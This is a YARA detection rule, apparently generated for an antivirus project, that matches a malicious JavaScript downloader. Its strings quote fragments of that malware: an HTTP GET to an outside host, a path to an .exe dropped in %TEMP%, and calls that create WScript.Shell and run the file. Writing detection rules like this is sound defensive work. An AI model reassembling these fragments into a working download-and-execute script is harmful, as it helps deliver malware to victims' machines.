rule sig_20160328_e6ba9970ec08645acbbb8505823413de {
  meta:
    description = "datamaliciousorder - file 20160328_e6ba9970ec08645acbbb8505823413de.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e48e1bf80cbd8c84d519599736fd7d715c31273a657ba0712bd8664a08edbaf0"

  strings:
    $s1  = "function Nkhidv() {return Wczawme[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"glx5oR3Xo.exe\";};" fullword ascii
    $s2  = "Aodozwhvc[Imjidutu](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Nmzydaj](Chikatip() * 11)} while (Aodozwhvc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ygsgdu(Yicsk, Mkewinalx){return Yicsk - Mkewinalx;};" fullword ascii
    $s5  = "var Wczawme = function Aqwmhboaoh() {return WScript[Itsfwvshsp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "return Ygsgdu(Secmmofao, Ablog);" fullword ascii
    $s7  = "function Qqlxb(Nwhnbjredb){Wczawme[\"Run\"](Nwhnbjredb, Kxnziowg, Kxnziowg);};" fullword ascii
    $s8  = "function Buieu() {return ((Xlpqogpfeh == true) && (Xlpqogpfeh == Kzznlrpre)) ? 1 : Kxnziowg;};" fullword ascii
    $s9  = "Xlpqogpfeh = true; " fullword ascii
    $s10 = "var Seyzlaoggo = new this[\"Date\"]();" fullword ascii
    $s11 = " while (Xufkumffmv){" fullword ascii
    $s12 = "Kzznlrpre = true; " fullword ascii
    $s13 = "var Xlpqogpfeh = false;" fullword ascii
    $s14 = "var Kzznlrpre = false;" fullword ascii
    $s15 = "function Bguqyxe()" fullword ascii
    $s16 = "var Oeljjj = false;" fullword ascii
    $s17 = "function Ivckwqus(Zxzgdhu) {var Mhegsfjmir = (1, 2, 3, 4, 5, Zxzgdhu); return Mhegsfjmir;};" fullword ascii
    $s18 = "function Yybrrgrsjd(){return Yvjrur;};" fullword ascii
    $s19 = "function Chikatip(){return 22;};" fullword ascii
    $s20 = "function Gadytbsdy(){return Itsfwvshsp;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}